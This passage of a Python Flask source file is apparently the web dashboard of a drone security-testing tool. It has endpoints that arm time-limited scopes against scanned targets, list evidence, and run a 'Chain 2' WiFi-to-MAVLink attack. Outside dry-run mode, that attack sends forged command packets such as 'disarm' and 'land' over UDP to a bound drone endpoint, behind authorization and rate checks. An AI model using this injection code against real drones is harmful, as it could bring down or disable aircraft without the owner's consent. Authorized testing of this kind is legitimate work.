    A brand-new browser starts at the current event tail so retained history is
    not replayed as fresh notifications.  Genuine EventSource reconnects still
    resume from ``Last-Event-ID``.  If the server restarted and its monotonic
    counter is now behind the browser's cursor, reset that stale cursor to the
    current tail so future events are delivered.
    """
    state = get_dashboard_state()
    header_last_id = request.headers.get("Last-Event-ID", type=int)
    query_last_id = request.args.get("last_id", type=int)
    cursor_provided = (
        "last_id" in request.args or "Last-Event-ID" in request.headers
    )

    with state.state_lock:
        tail_id = state.events[-1]["id"] if state.events else -1
        next_id = state.next_event_id

    last_id = query_last_id if query_last_id is not None else header_last_id
    if not cursor_provided or last_id is None or last_id >= next_id:
        last_id = tail_id

    def generate() -> Generator[str, None, None]:
        local_last = last_id
        # Flush headers immediately without replaying a domain event. Browsers
        # otherwise remain in EventSource.CONNECTING until the next event.
        yield ": connected\n\n"
        while True:
            with state.state_lock:
                new_events = deepcopy([
                    event for event in state.events
                    if event["id"] > local_last
                ])
            for ev in new_events:
                local_last = ev["id"]
                # Defensive: the event `type` is interpolated into the SSE
                # `event:` field; strip any newlines so a (currently
                # server-controlled) dynamic type can never inject a fake SSE
                # field. `id` is an int and `data` is JSON-serialized.
                event_type = str(ev["type"]).replace("\r", " ").replace("\n", " ")
                yield f"id: {ev['id']}\nevent: {event_type}\ndata: {json.dumps(ev['data'])}\n\n"
            time.sleep(0.5)

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# --- Pack arming / disarming / scopes / evidence endpoints ---

@dashboard.route("/api/packs/<pack_name>/<version>/arm", methods=["POST"])
def api_pack_arm(pack_name: str, version: str) -> tuple[Response, int] | Response:
    """Create a scoped authorization for a pack against a target."""
    state = get_dashboard_state()
    body = request.get_json(silent=True)
    if not isinstance(body, dict):
        return jsonify({"error": "JSON body required"}), 400

    required = ("target_identity", "permitted_actions", "time_limit_seconds",
                "stop_conditions", "sacrificial_target", "evidence_destination")
    missing = [f for f in required if f not in body]
    if missing:
        return jsonify({"error": f"Missing required fields: {', '.join(missing)}"}), 400

    # --- Strict type validation. Authorization is a security boundary, so a
    # truthy string ("false"), a stringified number, or a wrong container type
    # must be rejected, never silently coerced. ---
    target_identity = body["target_identity"]
    if not isinstance(target_identity, str) or not target_identity:
        return jsonify({"error": "target_identity must be a non-empty string"}), 400

    permitted_actions_raw = body["permitted_actions"]
    if (not isinstance(permitted_actions_raw, list)
            or not permitted_actions_raw
            or not all(isinstance(a, str) and a for a in permitted_actions_raw)):
        return jsonify({"error": "permitted_actions must be a non-empty list of strings"}), 400

    time_limit_raw = body["time_limit_seconds"]
    # bool is a subclass of int; reject it explicitly before the numeric check.
    if isinstance(time_limit_raw, bool) or not isinstance(time_limit_raw, (int, float)):
        return jsonify({"error": "time_limit_seconds must be a number"}), 400
    if not (0 < time_limit_raw <= MAX_ARM_SECONDS):
        return jsonify({"error": f"time_limit_seconds must be in (0, {MAX_ARM_SECONDS}]"}), 400

    stop_conditions_raw = body["stop_conditions"]
    if (not isinstance(stop_conditions_raw, list)
            or not all(isinstance(s, str) for s in stop_conditions_raw)):
        return jsonify({"error": "stop_conditions must be a list of strings"}), 400

    sacrificial_raw = body["sacrificial_target"]
    if not isinstance(sacrificial_raw, bool):
        return jsonify({"error": "sacrificial_target must be a boolean"}), 400

    evidence_destination = body["evidence_destination"]
    if not isinstance(evidence_destination, str) or not evidence_destination:
        return jsonify({"error": "evidence_destination must be a non-empty string"}), 400

    bounds_raw = body.get("bounds", {})
    if not isinstance(bounds_raw, dict):
        return jsonify({"error": "bounds must be an object"}), 400

    registry = state.pack_registry
    scope_mgr = state.scope_manager
    if registry is None or scope_mgr is None:
        return jsonify({"error": "Pack system not initialized"}), 500

    pack = registry.lookup(pack_name, version)
    if pack is None:
        return jsonify({"error": f"Pack not found: {pack_name} v{version}"}), 404

    # The target descriptor is derived from the SERVER-SIDE discovered target
    # record, not from client-asserted applicability. You can only arm against
    # a target the scanner actually found, and its Applicability Boundary is
    # checked against the target's real attributes rather than a tautology.
    with state.state_lock:
        target_record = deepcopy(state.targets.get(target_identity))
    if target_record is None:
        return jsonify({"error": f"Target not found: {target_identity!r}"}), 404
    td = _derive_target_descriptor(target_record)

    try:
        scope = scope_mgr.arm(
            pack_name=pack_name,
            pack_version=version,
            target=td,
            permitted_actions=frozenset(permitted_actions_raw),
            bounds=dict(bounds_raw),
            time_limit=timedelta(seconds=time_limit_raw),
            stop_conditions=list(stop_conditions_raw),
            sacrificial_target=sacrificial_raw,
            evidence_destination=evidence_destination,
        )
    except ValueError as exc:
        return jsonify({"error": str(exc)}), 400
    except LookupError as exc:
        return jsonify({"error": str(exc)}), 404

    _push_event(state, "scope_armed", {
        "pack_name": pack_name,
        "pack_version": version,
        "target_identity": target_identity,
        "expiry": scope.expiry.isoformat(),
    })

    return jsonify({
        "status": "armed",
        "scope_key": f"{pack_name}/{version}/{target_identity}",
        "expiry": scope.expiry.isoformat(),
        "pack_name": pack_name,
        "pack_version": version,
        "target_identity": target_identity,
    })


@dashboard.route("/api/packs/<pack_name>/<version>/disarm", methods=["POST"])
def api_pack_disarm(pack_name: str, version: str) -> tuple[Response, int] | Response:
    """Revoke authorization for a pack against a target."""
    state = get_dashboard_state()
    body = request.get_json(silent=True)
    if not isinstance(body, dict):
        return jsonify({"error": "JSON body required"}), 400

    target_identity = body.get("target_identity", "")
    scope_mgr = state.scope_manager
    if scope_mgr is None:
        return jsonify({"error": "Pack system not initialized"}), 500

    scope_mgr.disarm(
        pack_name=pack_name,
        pack_version=version,
        target_identity=target_identity,
    )

    _push_event(state, "scope_disarmed", {
        "pack_name": pack_name,
        "pack_version": version,
        "target_identity": target_identity,
    })

    return jsonify({
        "status": "disarmed",
        "pack_name": pack_name,
        "pack_version": version,
        "target_identity": target_identity,
    })


@dashboard.route("/api/scopes")
def api_scopes() -> Response:
    """List active authorization scopes with time-to-expiry."""
    state = get_dashboard_state()
    scope_mgr = state.scope_manager
    if scope_mgr is None:
        return jsonify([])

    with state.state_lock:
        scope_snapshot = scope_mgr.list_scopes()

    now = datetime.now(timezone.utc)
    scopes_list = []
    for key, scope in scope_snapshot:
        remaining = (scope.expiry - now).total_seconds()
        scopes_list.append({
            "pack_name": scope.pack_identity.name,
            "pack_version": scope.pack_identity.version,
            "target_identity": scope.target.identity,
            "expiry": scope.expiry.isoformat(),
            "time_remaining_seconds": max(0, remaining),
            "is_expired": scope.is_expired,
            "disarmed": scope.disarmed,
            "sacrificial_target": scope.sacrificial_target,
            "permitted_actions": sorted(scope.permitted_actions),
            "stop_conditions": scope.stop_conditions,
            "evidence_destination": scope.evidence_destination,
        })
    return jsonify(scopes_list)


@dashboard.route("/api/evidence")
def api_evidence() -> Response:
    """List evidence records."""
    state = get_dashboard_state()
    store = state.evidence_store
    if store is None:
        return jsonify([])

    records = []
    for i, rec in enumerate(store.records):
        records.append(_serialize_evidence_record(rec, record_id=str(i)))
    return jsonify(records)


@dashboard.route("/api/evidence/<record_id>")
def api_evidence_detail(record_id: str) -> tuple[Response, int] | Response:
    """Get specific evidence record details."""
    state = get_dashboard_state()
    store = state.evidence_store
    if store is None:
        return jsonify({"error": "Evidence store not initialized"}), 500

    try:
        idx = int(record_id)
    except (ValueError, TypeError):
        return jsonify({"error": "Invalid record ID"}), 404

    all_records = store.records
    if idx < 0 or idx >= len(all_records):
        return jsonify({"error": "Evidence record not found"}), 404

    rec = all_records[idx]
    return jsonify(_serialize_evidence_record(rec, record_id=record_id))


def _serialize_evidence_record(rec: ExecutionRecord, *, record_id: str) -> dict[str, Any]:
    """Serialize an ExecutionRecord to a JSON-safe dict."""
    transition_log = []
    for entry in rec.transition_log:
        if isinstance(entry, tuple) and len(entry) == 2:
            state_val, ts = entry
            state_str = state_val.value if hasattr(state_val, "value") else str(state_val)
            ts_str = ts.isoformat() if hasattr(ts, "isoformat") else str(ts)
            transition_log.append({"state": state_str, "timestamp": ts_str})
        else:
            transition_log.append(entry)

    prereq_modes = {}
    for k, v in rec.prerequisite_modes.items():
        prereq_modes[k] = v.value if hasattr(v, "value") else str(v)

    return {
        "id": record_id,
        "capability_version": rec.capability_version,
        "target_identity": rec.target_identity,
        # prerequisite_values / verification_evidence are deep-frozen on the
        # record (read-only mappings / tuples); thaw to plain JSON types.
        "prerequisite_values": jsonable(rec.prerequisite_values),
        "prerequisite_modes": prereq_modes,
        "authorization_scope_ref": rec.authorization_scope_ref,
        "start_time": rec.start_time.isoformat(),
        "end_time": rec.end_time.isoformat(),
        "transition_log": transition_log,
        "verification_evidence": jsonable(rec.verification_evidence),
        "stop_reason": rec.stop_reason,
        "hardware_identity": rec.hardware_identity,
    }


# --- Execution control ---

@dashboard.route("/api/executions/<exec_id>/cancel", methods=["POST"])
def api_execution_cancel(exec_id: str) -> tuple[Response, int] | Response:
    """Request runtime cancellation of an in-flight bounded-worker execution.

    Sets the execution's cancellation token; the bounded worker observes it
    between Result State steps (or abandons the task on timeout). Returns 404
    when no execution with that id is currently in flight.
    """
    state = get_dashboard_state()
    with state.state_lock:
        cancel_event = state.executions.get(exec_id)
        if cancel_event is not None:
            cancel_event.set()
    if cancel_event is None:
        return jsonify({
            "error": "No in-flight execution with that id",
            "execution_id": exec_id,
        }), 404
    _push_event(state, "execution_cancel_requested", {"execution_id": exec_id})
    return jsonify({"status": "cancel_requested", "execution_id": exec_id})


# --- Chain 2: WiFi → MAVLink injection endpoints ---

@dashboard.route("/api/chain2/status")
def api_chain2_status() -> Response:
    state = get_dashboard_state()
    with state.state_lock:
        snapshot = deepcopy(state.chain2_state)
    return jsonify(snapshot)


@dashboard.route("/api/chain2/simulate", methods=["POST"])
def api_chain2_simulate() -> tuple[Response, int] | Response:
    """Run a simulated Chain 2 attack for demo purposes."""
    state = get_dashboard_state()
    try:
        from exploit_chains.wifi_mavlink_chain import (
            ATTACK_COMMANDS,
            build_command_long,
        )
    except ImportError:
        return jsonify({"error": "Chain 2 module not found"}), 500

    target_id = request.json.get("target_id") if request.json else None
    commands = request.json.get("commands", ["disarm", "land"]) if request.json else ["disarm", "land"]

    results = []
    actions = []
    for cmd_name in commands:
        if cmd_name not in ATTACK_COMMANDS:
            results.append({"command": cmd_name, "status": "unknown"})
            continue
        cmd = ATTACK_COMMANDS[cmd_name]
        pkt = build_command_long(1, 1, cmd["cmd_id"], list(cmd["params"]))
        entry = {
            "id": uuid.uuid4().hex[:8],
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target_id": target_id,
            "command": cmd_name,
            "description": cmd["desc"],
            "severity": cmd["severity"],
            "status": "simulated",
            "packet_hex": pkt.hex(),
            "packet_size": len(pkt),
        }
        results.append(entry)
        actions.append({
            "id": entry["id"],
            "timestamp": entry["timestamp"],
            "target_id": target_id,
            "target_name": target_id or "MAVLink Target",
            "action": f"chain2_{cmd_name}",
            "label": f"Chain 2: {cmd['desc']}",
            "status": "simulated",
            "result": f"[SIMULATED] {cmd['desc']} ({len(pkt)} bytes)",
        })

    _record_chain2_history(state, results, actions)

    return jsonify({
        "chain": "wifi_mavlink",
        "status": "simulated",
        "results": results,
    })


@dashboard.route("/api/chain2/inject", methods=["POST"])
def api_chain2_inject() -> tuple[Response, int] | Response:
    """Inject a MAVLink command via Chain 2 (dry-run in simulate mode)."""
    state = get_dashboard_state()
    if not request.json:
        return jsonify({"error": "JSON body required"}), 400

    target_id = request.json.get("target_id")
    command = request.json.get("command")
    target_endpoint = request.json.get("endpoint")

    if not command:
        return jsonify({"error": "command is required"}), 400

    try:
        from exploit_chains.wifi_mavlink_chain import ATTACK_COMMANDS, build_command_long
    except ImportError:
        return jsonify({"error": "Chain 2 module not found"}), 500

    if command not in ATTACK_COMMANDS:
        return jsonify({"error": f"Unknown command: {command}"}), 400

    cmd = ATTACK_COMMANDS[command]
    pkt = build_command_long(1, 1, cmd["cmd_id"], list(cmd["params"]))
    with state.state_lock:
        dry_run = state.simulate_mode or state.dry_run_mode

    # A live injection (not dry-run) is a real outward transmission and is
    # unified under the same scoped-authorization boundary as every other
    # capability: it requires an armed scope for the Chain 2 pack against this
    # target. A dry-run builds the packet for inspection and transmits nothing.
    chain2_pack = "sim-chain2_wifi_mavlink"
    chain2_version = "0.1.0"
    send_endpoint: str | None = None
    send_count = 0
    send_interval = CHAIN2_MIN_SEND_INTERVAL_S

    def _denied(status: str, reason: str) -> tuple[Response, int]:
        record = {
            "id": uuid.uuid4().hex[:8],
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target_id": target_id,
            "command": command,
            "description": cmd["desc"],
            "severity": cmd["severity"],
            "status": status,
            "error": reason,
            "packet_hex": pkt.hex(),
            "packet_size": len(pkt),
        }
        _record_chain2_evidence(state, record, chain2_pack, chain2_version)
        return jsonify(record), 403

    if not dry_run:
        scope_mgr = state.scope_manager
        try:
            if scope_mgr is None:
                raise AuthorizationError("Authorization subsystem not initialized")
            scope = scope_mgr.authorize(
                pack_name=chain2_pack,
                pack_version=chain2_version,
                target_identity=target_id or "",
                action=command,
            )
        except AuthorizationError as exc:
            return _denied("authorization_denied", str(exc))

        # Exact-target + count/rate bounds (SECURITY.md): a live injection may
        # only reach the endpoint the scope bound, and only within the bound
        # packet count and rate. The destination is taken from the scope, not
        # the client; a request to any other endpoint is refused and nothing
        # is sent.
        bounds = scope.bounds or {}
        bound_endpoint = bounds.get("endpoint")
        max_packets = bounds.get("max_packets")
        if not isinstance(bound_endpoint, str) or not bound_endpoint:
            return _denied("bounds_violation", "scope bounds do not bind an endpoint")
        if target_endpoint is not None and target_endpoint != bound_endpoint:
            return _denied(
                "bounds_violation",
                f"requested endpoint {target_endpoint!r} is not the bound endpoint "
                f"{bound_endpoint!r}",
            )
        if isinstance(max_packets, bool) or not isinstance(max_packets, int) or max_packets < 1:
            return _denied("bounds_violation", "scope bounds do not bound a positive packet count")
        if ":" not in bound_endpoint or len(bound_endpoint.rsplit(":", 1)) != 2:
            return _denied("bounds_violation", "bound endpoint must be host:port")
        send_endpoint = bound_endpoint
        send_count = min(int(max_packets), CHAIN2_MAX_SEND_PACKETS)
        interval_bound = bounds.get("min_interval_s", CHAIN2_MIN_SEND_INTERVAL_S)
        try:
            send_interval = max(CHAIN2_MIN_SEND_INTERVAL_S, float(interval_bound))
        except (TypeError, ValueError):
            return _denied("bounds_violation", "min_interval_s must be a number")

    entry = {
        "id": uuid.uuid4().hex[:8],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_id": target_id,
        "command": command,
        "description": cmd["desc"],
        "severity": cmd["severity"],
        "status": "dry_run" if dry_run else "pending",
        "packet_hex": pkt.hex(),
        "packet_size": len(pkt),
    }

    if not dry_run and send_endpoint is not None:
        import socket as _sock
        host, port_str = send_endpoint.rsplit(":", 1)
        entry["endpoint"] = send_endpoint
        entry["packets_sent_max"] = send_count
        try:
            sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
            sent = 0
            for i in range(send_count):
                p = build_command_long(1, 1, cmd["cmd_id"],
                                       list(cmd["params"]), seq=i)
                sock.sendto(p, (host, int(port_str)))
                sent += 1
                time.sleep(send_interval)
            sock.close()
            entry["status"] = "sent"
            entry["packets_sent"] = sent
        except Exception as e:
            entry["status"] = "error"
            entry["error"] = str(e)

    # Attach the truthful final Result State for this outcome.
    final_states = _CHAIN2_STATE_PATHS.get(entry["status"], [ResultState.PREVIEWED])
    entry["result_state"] = final_states[-1].value

    action = {
        "id": entry["id"],
        "timestamp": entry["timestamp"],
        "target_id": target_id,
        "target_name": target_id or "MAVLink Target",
        "action": f"chain2_{command}",
        "label": f"Chain 2: {cmd['desc']}",
        "status": entry["status"],
        "result_state": entry["result_state"],
        "result": f"[{entry['status'].upper()}] {cmd['desc']}",
    }
    _record_chain2_history(state, [entry], [action])
    _record_chain2_evidence(state, entry, chain2_pack, chain2_version)

    return jsonify(entry)


@dashboard.route("/api/chain2/commands")
def api_chain2_commands() -> tuple[Response, int] | Response:
    """List available Chain 2 attack commands."""
    try:
        from exploit_chains.wifi_mavlink_chain import ATTACK_COMMANDS
        return jsonify(ATTACK_COMMANDS)
    except ImportError:
        return jsonify({"error": "Chain 2 module not found"}), 500


def create_app(state: DashboardState | None = None) -> Flask:
    """Create a Flask dashboard with isolated, app-owned runtime state."""
    if state is None:
        state = create_dashboard_state()
    elif not isinstance(state, DashboardState):
        raise TypeError("state must be a DashboardState instance or None")

    flask_app = Flask(__name__)
    flask_app.config["SEND_FILE_MAX_AGE_DEFAULT"] = STATIC_CACHE_SECONDS
    owner_token = object()
    state._claim_app(owner_token)
    try:
        flask_app.extensions[STATE_EXTENSION_KEY] = state
        flask_app.after_request(_apply_security_headers)
        flask_app.register_blueprint(dashboard)
    except BaseException:
        flask_app.extensions.pop(STATE_EXTENSION_KEY, None)
        state._release_app(owner_token)
        raise
    return flask_app


# Import compatibility: existing WSGI users can continue importing ``app``.
app = create_app()


def main() -> None:
    parser = argparse.ArgumentParser(description="Drone Scanner Web UI")
    parser.add_argument("--port", type=int, default=5000)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--simulate", action="store_true",
                        help="Demo mode with simulated targets")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--wifi-iface", default="wlan0",
                        help="Default WiFi interface (default: wlan0)")
    parser.add_argument("--ble-iface", default="hci0",
                        help="Default BLE interface (default: hci0)")
    parser.add_argument("--sdr-args", default="driver=uhd",
                        help="Default SoapySDR device args (default: driver=uhd)")
    args = parser.parse_args()

    state = get_dashboard_state(app)
    with state.state_lock:
        state.simulate_mode = args.simulate
        # dry_run_mode governs only whether the executor performs real I/O; it
        # does NOT waive authorization. Every execute still requires an armed,
        # time-limited, per-target scope (see _execute_via_registry). The old
        # global live-actions switch has been removed in favor of scoping.
        state.dry_run_mode = True
        state.scan_defaults.update({
            "wifi_iface": args.wifi_iface,
            "ble_iface": args.ble_iface,
            "sdr_args": args.sdr_args,
        })

    if not args.simulate:
        hardware = detect_hardware()
        with state.state_lock:
            state.hw_status = deepcopy(hardware)

    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
